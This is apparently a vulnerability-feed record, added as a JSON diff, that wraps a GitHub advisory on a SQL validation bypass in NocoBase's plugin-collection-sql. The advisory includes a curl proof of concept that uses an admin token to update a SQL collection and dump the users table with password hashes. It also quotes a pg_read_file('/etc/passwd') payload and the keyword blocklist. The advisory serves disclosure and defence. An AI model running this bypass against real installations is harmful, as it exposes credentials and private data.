@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/33259962?v=4\", \"events_url\": \"https://api.github.com/users/p80n-sec/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/p80n-sec/followers\", \"following_url\": \"https://api.github.com/users/p80n-sec/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/p80n-sec/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/p80n-sec\", \"id\": 33259962, \"login\": \"p80n-sec\", \"node_id\": \"MDQ6VXNlcjMzMjU5OTYy\", \"organizations_url\": \"https://api.github.com/users/p80n-sec/orgs\", \"received_events_url\": \"https://api.github.com/users/p80n-sec/received_events\", \"repos_url\": \"https://api.github.com/users/p80n-sec/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/p80n-sec/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/p80n-sec/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/p80n-sec\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-41641\", \"cvss\": {\"score\": 7.2, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 7.2, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-89\", \"name\": \"Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\"}, {\"cwe_id\": \"CWE-284\", \"name\": \"Improper Access Control\"}], \"description\": \"## Summary\\n\\nThe `checkSQL()` validation function that blocks dangerous SQL keywords (e.g., `pg_read_file`, `LOAD_FILE`, `dblink`) is applied on the `collections:create` and `sqlCollection:execute` endpoints but is entirely missing on the `sqlCollection:update` endpoint. An attacker with collection management permissions can create a SQL collection with benign SQL, then update it with arbitrary SQL that bypasses all validation, and query the collection to execute the injected SQL and exfiltrate data.\\n\\n**Affected component:** `@nocobase/plugin-collection-sql`\\n**Affected versions:** <= 2.0.32 (confirmed)\\n**Minimum privilege:** Collection management permissions (`pm.data-source-manager.collection-sql` snippet)\\n\\n## Vulnerable Code\\n\\n### `checkSQL` is applied on create and execute\\n\\n`packages/plugins/@nocobase/plugin-collection-sql/src/server/resources/sql.ts`\\n\\n```javascript\\n// Line 51-60 — execute action: checkSQL IS called\\nexecute: async (ctx: Context, next: Next) => {\\n    const { sql } = ctx.action.params.values || {};\\n    try { checkSQL(sql); } catch (e) { ctx.throw(400, ctx.t(e.message)); }\\n    // ...\\n}\\n```\\n\\n### `checkSQL` is NOT applied on update\\n\\n```javascript\\n// Line 105-118 — update action: checkSQL IS NOT called\\nupdate: async (ctx: Context, next: Next) => {\\n    const transaction = await ctx.app.db.sequelize.transaction();\\n    try {\\n        const { upRes } = await updateCollection(ctx, transaction);\\n        // No checkSQL() call anywhere in this path!\\n        const [collection] = upRes;\\n        await collection.load({ transaction, resetFields: true });\\n        await transaction.commit();\\n    }\\n    // ...\\n}\\n```\\n\\n### The `checkSQL` function itself\\n\\n`packages/plugins/@nocobase/plugin-collection-sql/src/server/utils.ts:10-28`\\n\\n```javascript\\nexport const checkSQL = (sql: string) => {\\n  const dangerKeywords = [\\n    'pg_read_file', 'pg_write_file', 'pg_ls_dir', 'LOAD_FILE',\\n    'INTO OUTFILE', 'INTO DUMPFILE', 'dblink', 'lo_import', // ...\\n  ];\\n  sql = sql.trim().split(';').shift();\\n  if (!/^select/i.test(sql) && !/^with([\\\\s\\\\S]+)select([\\\\s\\\\S]+)/i.test(sql)) {\\n    throw new Error('Only supports SELECT statements or WITH clauses');\\n  }\\n  if (dangerKeywords.some((keyword) => sql.toLowerCase().includes(keyword.toLowerCase()))) {\\n    throw new Error('SQL statements contain dangerous keywords');\\n  }\\n};\\n```\\n\\n## PoC\\n\\n```bash\\nTOKEN=\\\"<admin_jwt_token>\\\"\\n\\n# Step 1: Create collection with valid SQL (passes checkSQL)\\ncurl -s http://TARGET:13000/api/collections:create \\\\\\n  -H \\\"Authorization: Bearer $TOKEN\\\" \\\\\\n  -H \\\"Content-Type: application/json\\\" \\\\\\n  -d '{\\n    \\\"name\\\": \\\"exfil_collection\\\",\\n    \\\"sql\\\": \\\"SELECT 1 as id\\\",\\n    \\\"fields\\\": [{\\\"name\\\": \\\"id\\\", \\\"type\\\": \\\"integer\\\"}],\\n    \\\"template\\\": \\\"sql\\\"\\n  }'\\n\\n# Step 2: Verify checkSQL blocks dangerous SQL on create\\ncurl -s http://TARGET:13000/api/collections:create \\\\\\n  -H \\\"Authorization: Bearer $TOKEN\\\" \\\\\\n  -H \\\"Content-Type: application/json\\\" \\\\\\n  -d '{\\\"name\\\": \\\"blocked\\\", \\\"sql\\\": \\\"SELECT pg_read_file('\\\\''/etc/passwd'\\\\'')\\\", \\\"fields\\\": [], \\\"template\\\": \\\"sql\\\"}'\\n# Returns: 400 \\\"SQL statements contain dangerous keywords\\\"\\n\\n# Step 3: Update with dangerous SQL — bypasses checkSQL entirely\\ncurl -s \\\"http://TARGET:13000/api/sqlCollection:update?filterByTk=exfil_collection\\\" \\\\\\n  -X POST \\\\\\n  -H \\\"Authorization: Bearer $TOKEN\\\" \\\\\\n  -H \\\"Content-Type: application/json\\\" \\\\\\n  -d '{\\n    \\\"sql\\\": \\\"SELECT * FROM users\\\",\\n    \\\"fields\\\": [\\n      {\\\"name\\\": \\\"id\\\", \\\"type\\\": \\\"integer\\\"},\\n      {\\\"name\\\": \\\"email\\\", \\\"type\\\": \\\"string\\\"},\\n      {\\\"name\\\": \\\"password\\\", \\\"type\\\": \\\"string\\\"}\\n    ]\\n  }'\\n# Returns: 200 OK — no validation!\\n\\n# Step 4: Query the collection to exfiltrate data\\ncurl -s \\\"http://TARGET:13000/api/exfil_collection:list\\\" \\\\\\n  -H \\\"Authorization: Bearer $TOKEN\\\"\\n# Returns: all rows from users table including password hashes\\n```\\n\\n## Impact\\n\\n- **Confidentiality:** Arbitrary `SELECT` queries exfiltrate any table. Confirmed dump of the `users` table including password hashes.\\n- **Integrity/Availability:** Although `checkSQL` strips after the first semicolon, dangerous single-statement operations like `SELECT ... INTO`, subqueries with side effects, or database-specific functions (`pg_read_file`, `LOAD_FILE`, `dblink`) are all accessible through the update bypass.\\n- **Privilege escalation:** On PostgreSQL, `dblink` enables lateral movement to other databases. `pg_read_file` reads arbitrary files from the database server filesystem.\\n\\n## Fix Suggestion\\n\\n1. **Add `checkSQL()` to the `update` action.** The one-line fix:\\n   ```javascript\\n   update: async (ctx: Context, next: Next) => {\\n       const { sql } = ctx.action.params.values || {};\\n       if (sql) {\\n           try { checkSQL(sql); } catch (e) { ctx.throw(400, ctx.t(e.message)); }\\n       }\\n       // ... existing code ...\\n   }\\n   ```\\n\\n2. **Centralize validation in middleware** rather than per-action. Apply `checkSQL` in the resource middleware for any action that accepts a `sql` field, so future actions cannot accidentally skip it.\\n\\n3. **Strengthen the blocklist.** The current list is missing `COPY` (PostgreSQL file I/O and RCE), `CREATE`, `ALTER`, `DROP`, `GRANT`, `SET`, and `EXECUTE`. Consider switching to a parser-based allowlist that only permits `SELECT` and `WITH ... SELECT` at the AST level rather than relying on keyword blocklisting.\", \"epss\": {\"percentage\": 0.01833, \"percentile\": 0.76505}, \"ghsa_id\": \"GHSA-wrwh-c28m-9jjh\", \"github_reviewed_at\": \"2026-04-22T20:07:11Z\", \"html_url\": \"https://github.com/advisories/GHSA-wrwh-c28m-9jjh\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-wrwh-c28m-9jjh\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-41641\"}], \"nvd_published_at\": \"2026-05-07T06:16:05Z\", \"published_at\": \"2026-04-22T20:07:11Z\", \"references\": [\"https://github.com/nocobase/nocobase/security/advisories/GHSA-wrwh-c28m-9jjh\", \"https://github.com/nocobase/nocobase/pull/9134\", \"https://github.com/nocobase/nocobase/commit/851aee543efa894142e0f7be03eb55d9cec06a91\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-41641\", \"https://github.com/nocobase/nocobase/releases/tag/v2.0.39\", \"https://github.com/advisories/GHSA-wrwh-c28m-9jjh\"], \"repository_advisory_url\": \"https://api.github.com/repos/nocobase/nocobase/security-advisories/GHSA-wrwh-c28m-9jjh\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/nocobase/nocobase\", \"summary\": \"@nocobase/plugin-collection-sql: SQL Validation Bypass Through Missing `checkSQL` Call\", \"type\": \"reviewed\", \"updated_at\": \"2026-05-08T20:10:03Z\", \"url\": \"https://api.github.com/advisories/GHSA-wrwh-c28m-9jjh\", \"vulnerabilities\": [{\"first_patched_version\": \"2.0.39\", \"package\": {\"ecosystem\": \"npm\", \"name\": \"@nocobase/plugin-collection-sql\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 2.0.39\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-wrwh-c28m-9jjh",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "@nocobase/plugin-collection-sql: < 2.0.39"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-41641"
+    ],
+    "cvss_score": 7.2,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "@nocobase/plugin-collection-sql"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-20T19:52:03.233988Z",
+  "provenance": {
+    "content_sha256": "d29fb6085443271cfcd910c7426a026161a632ca94d225ff81634a525eedeffe",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-04-22T20:07:11Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-wrwh-c28m-9jjh",
+  "status": "active",
+  "title": "@nocobase/plugin-collection-sql: SQL Validation Bypass Through Missing `checkSQL` Call",
+  "updated_at": "2026-05-08T20:10:03Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-wrwh-c28m-9jjh"
+}
